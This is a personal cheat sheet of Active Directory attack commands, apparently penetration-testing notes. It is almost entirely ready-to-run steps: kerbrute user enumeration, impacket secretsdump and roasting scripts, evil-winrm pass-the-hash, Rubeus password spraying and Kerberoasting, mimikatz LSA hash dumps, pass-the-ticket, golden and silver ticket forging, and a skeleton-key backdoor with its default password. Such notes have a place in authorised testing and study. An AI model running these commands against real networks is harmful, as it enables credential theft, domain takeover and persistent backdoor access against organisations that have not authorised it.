# User enumeration
## Attack
```cmd
:: SPN accounts
setspn -T medin -Q */*
```

```bash
# VERY IMPORTANT, Add DNS domain name in /etc/hosts / C:\Windows\System32\drivers\etc\hosts
kerbrute userenum --dc DOMAIN_CONTROLLER -d DOMAIN WORDLIST 
```

# Credentials dump
## Attack
```bash
sudo python3 ~/Software/impacket/examples/secretsdump.py [DOMAIN_NAME]/USER[:PASSWORD]@IP
```

# Pass the hash
## Attack
```bash
~/Scripts/evil-winrm/evil-winrm.rb  -i IP -u USER -H NTLM_HASH -s '/home/vagrant/Scripts/PowerSploit/'
```

# Fetch Ticket
## Attack
```cmd
Rubeus.exe harvest /interval:30
```

# Password
## Attack
```cmd
:: VERY IMPORTANT, Add DNS domain name in /etc/hosts / C:\Windows\System32\drivers\etc\hosts

:: Password spraying
:: Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.
Rubeus.exe brute /password:KNOWN_PASSWORD /noticket
```

# Crack service password - Kerberoasting
## Enumerate vulnerable accounts
Use BloodHound (never tried)

## Attack
```cmd
:: Dump Kerberos hash of any kerberoastable users
Rubeus.exe kerberoast
```

```bash
sudo python3 ~/Software/impacket/examples/GetUserSPNs.py DOMAIN_NAME/USER:PASSWORD -dc-ip DOMAIN_CONTROLLER_IP -format hashcat -request
```

# Crack password - AS-REP
Not limited to service accounts, but can only be used on users with pre-authentication disabled.

## Attack
```cmd
Rubeus.exe asreproast
```

```bash
sudo python3 ~/Software/impacket/examples/GetNPUsers.py DOMAIN_NAME/USER[:PASSWORD] -usersfile USERSFILE -format hashcat -request
```

# Dump hashes (ntlm / lm)
## Attack
```cmd
mimikatz.exe
privilege::debug
:: Check output is '20' OK

lsadump::lsa /patch
```

# Pass the ticket
## Attack
```cmd
mimikatz.exe
privilege::debug
:: Check output is '20' OK

:: Export tickets into current directory
sekurlsa::tickets /export
kerberos::ptt TICKET
```

# Golden ticket
## Attack
```cmd
mimikatz.exe

privilege::debug
:: Check output is '20' OK

:: Dump KRBTGT hash
:: Replace "krbtgt" by any service for a silver ticket
lsadump::lsa /inject /name:krbtgt

:: Create a golden ticket
Kerberos::golden /user: /domain: /sid: /krbtgt: /id:500

:: Create a silver ticket
:: Use a service account sid
Kerberos::golden /user: /domain: /sid: /krbtgt: /id:1103

:: Use the ticket
misc::cmd
exit

:: Then access other ressources like:
dir \\Desktop-1\c$
```

# Backdoor with Skeleton key
The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

## Attack
```cmd
mimikatz.exe
privilege::debug
:: Check output is '20' OK

misc::skeleton
exit

:: Then use the skeleton key
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
dir \\Desktop-1\c$ /user:Machine1 mimikatz
```
